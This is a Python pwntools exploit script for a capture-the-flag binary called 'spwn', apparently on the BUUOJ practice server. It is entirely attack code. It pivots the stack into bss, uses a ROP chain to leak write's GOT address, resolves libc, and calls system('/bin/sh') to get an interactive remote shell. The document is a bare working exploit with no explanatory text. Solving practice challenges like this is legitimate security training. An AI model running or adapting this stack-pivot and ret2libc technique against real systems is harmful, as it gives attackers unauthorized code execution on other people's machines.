from pwn import *
from LibcSearcher import *
from yaml import dump

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('../spwn')
libc = ELF('../libc-2.23.so')

target = remote('node4.buuoj.cn', 28524)
# target = process('../spwn')

# ESP points to bss.
bss_buf = 0x804A300
leave = 0x08048511

write_plt = elf.plt['write']
write_got = elf.got['write']
main= elf.sym['main']

payload = p32(write_plt) + p32(main) + p32(0x1) + p32(write_got) + p32(0x4)
target.sendafter('name?', payload)
payload = b'a' * 0x18 + p32(bss_buf - 0x4) + p32(leave)
# gdb.attach(target)
target.sendafter('say?', payload)

write_addr = u32(target.recv(4))
libc.address = write_addr - libc.sym['write']
system = libc.sym['system']
shell = next(libc.search(b'/bin/sh'))

payload = p32(system) + p32(0) + p32(shell)
target.sendlineafter('name?', payload)
payload = b'a' * 0x18 + p32(bss_buf - 0x4) + p32(leave)
target.sendafter('say?', payload)

target.interactive()